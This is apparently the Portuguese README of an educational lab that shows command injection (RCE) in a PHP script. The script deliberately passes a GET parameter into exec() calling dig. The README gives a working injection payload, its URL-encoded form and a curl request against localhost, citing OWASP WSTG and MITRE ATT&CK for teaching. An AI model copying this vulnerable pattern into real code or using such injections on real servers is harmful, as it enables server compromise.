 # poc-rce-php-lab
Laboratório educacional de injeção de comando (RCE) em PHP via parâmetro GET.

## Introdução
O labotatório serve para demonstração prática do teste de injeção de comando demonstrado pelo WSTG (OWASP).

## Técnicas de invasão catalogadas do MITRE ATT&CK

- Acesso Inicial: [Exploit Public-Facing Application | T1190](https://attack.mitre.org/techniques/T1190/)

- Execução: [Command and Scripting Interpreter | T1059](https://attack.mitre.org/techniques/T1059/)

## Técnica de teste prático do WSTG (OWASP)

- Técnica de injeção: [Testing for Command Injection | WSTG-INPV-12](https://wstg.owasp.org/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection/)

## Explicação
A vulnerabilidade descrita pela técnica WSTG-INPV-12 descreve que o arquivo vulnerável que está rodando no backend no servidor com acesso direto ao terminal pode permitir execução de código remoto (RCE) mesmo que o propósito não seja pelo qual foi programado.


Eu criei um arquivo chamado index.php com acesso direto ao terminal usando a função exec() do php, ele chama o dig com o objetivo de consultar o ip de dominios.

'
http://127.0.0.1/?comando=google.com

IP do dominio google.com: 172.217.30.238
'

'''
<?php
  // entrada da url
  $cmd = $_GET['comando'] ?? null;
  $saida = exec('dig "' . $cmd . '" +short');
  echo "IP do dominio ${cmd}: " . $saida . " \n";
?>
'''

Qual é a problemática? quando você entende de shell script/bash terá a capacidade de manipular como o terminal se comporta.

Exemplo de código capaz de quebrar a lógica do código principal.

'
" ; cat index.php | tr -d "\n" #
'
Como faz para injetar esse código na url? convertendo caracteres especiais e espaços no formato da url que está em hexadecimal 

'
%20 = ' '
%22 = '"'
%3b = ';'
%23 = '#
'

No final ficará assim

'
%22%20%3b%20cat%20index.php%20|%20tr%20-d%20%22%5cn%22%20%23
'

Na url

'
curl -s 'http://localhost:8080/?comando=google.com%22%20%3b%20cat%20index.php%20|%20tr%20-d%20%22%5cn%22%20%23'
'

A saída do comando vai ser o código do index.php

## Parte prática

### Instalação
'''
apt install php curl
'''

Rode o PHP na pasta do server

'''
php -S 127.0.0.1:8080
'''

Execute o poc.sh

'''
bash poc.sh
'''
